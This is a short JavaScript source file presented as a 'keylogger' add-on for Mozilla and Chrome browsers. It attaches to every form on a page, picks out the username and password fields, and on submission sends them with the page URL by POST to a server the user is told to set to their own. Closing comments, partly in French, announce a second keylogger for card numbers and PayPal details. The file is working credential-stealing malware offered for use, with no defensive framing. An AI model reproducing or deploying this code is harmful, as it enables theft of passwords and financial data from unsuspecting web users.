   
 //Keylogger adon mozilla,works with chrome extension
	 
 var forms = document.getElementsByTagName('form');
 for (var i = 0; i < forms.length; i++) {
 var form = forms[i];
 var xhr = new XMLHttpRequest();
 xhr.open('POST', 'http://127.0.0.1/mozilla/log.php'); // Change http://127.0.0.1 to YOUR WEB SERVER
     var fields = form.getElementsByTagName('input');      
      for (var j = 0; j < fields.length; j++) {
          var f = fields[j];
          if (!form._pass && f.type == 'password')
              form._pass = f;
          else if (!form._user && (f.type == 'text' || f.type == 'email'))
              form._user = f;

          if (!(form._user !== undefined && form._pass !== undefined))
              continue;
              form.onsubmit = function() {
              if (this._user.value && this._pass.value) {                 				 
                var userName = this._user.value
                var passWord = this._pass.value
				var param = ""
				param += 'user='+userName+'&pass='+passWord +document.URL
             
			   xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
               xhr.send(param);
				
              }
                  }};
              }   
	
	//Capture card number paypal ....etc 2nd keylogger
	
	//Capture card number paypal ....etc 2nd keylogger
	
	//c'est le 2nd keylogger different du 1ier car le 1ier va récupérer que les identifiants de connexion	


